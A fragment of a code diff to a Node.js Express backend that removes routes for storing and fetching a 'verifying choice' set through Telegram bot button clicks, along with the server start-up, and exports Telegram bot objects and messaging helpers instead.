-      }
-    }
-
-    res.json({ choice: null });
-
-  } catch (err) {
-    console.error("Check verifying choice error:", err);
-    res.status(500).json({ error: "Internal server error" });
-  }
-});
-
-// ============================================================================
-// POST /update-verifying-choice - Update verifying choice when bot clicks button
-// ============================================================================
-
-app.post("/update-verifying-choice", (req, res) => {
-  try {
-    const { verifyingId, choice } = req.body;
-
-    if (!verifyingId || !choice) {
-      return res.status(400).json({ error: "Missing verifyingId or choice" });
-    }
-
-    if (!pendingVerifying[verifyingId]) {
-      pendingVerifying[verifyingId] = {};
-    }
-
-    pendingVerifying[verifyingId].choice = choice;
-    pendingVerifying[verifyingId].updatedAt = Date.now();
-
-    res.json({ ok: true });
-
-  } catch (err) {
-    console.error("❌ Update verifying choice error:", err);
-    res.status(500).json({ error: "Internal server error" });
-  }
-});
-
-// ============================================================================
-// GET /get-verifying-info/:verifyingId - Get verifying info
-// ============================================================================
-
-app.get("/get-verifying-info/:verifyingId", (req, res) => {
-  try {
-    const { verifyingId } = req.params;
-    const entry = pendingVerifying[verifyingId];
-
-    if (entry) {
-      return res.json(entry);
-    }
-
-    res.json(null);
-
-  } catch (err) {
-    console.error("❌ Get verifying info error:", err);
-    res.status(500).json({ error: "Internal server error" });
-  }
-});
-
-// ============================================================================
-// Start server
-// ============================================================================
-
-const server = app.listen(PORT, () => {
-  console.log(`✅ Backend running on port ${PORT}`);
-  startSelfPing();
-});
-
-module.exports = { app, server };
+module.exports = { 
+  bot, 
+  bot2,
+  broadcastMessage,
+  sendFollowUpMessage,
+  userWinnerTelegram,
+  botsThatClickedPage1
+};
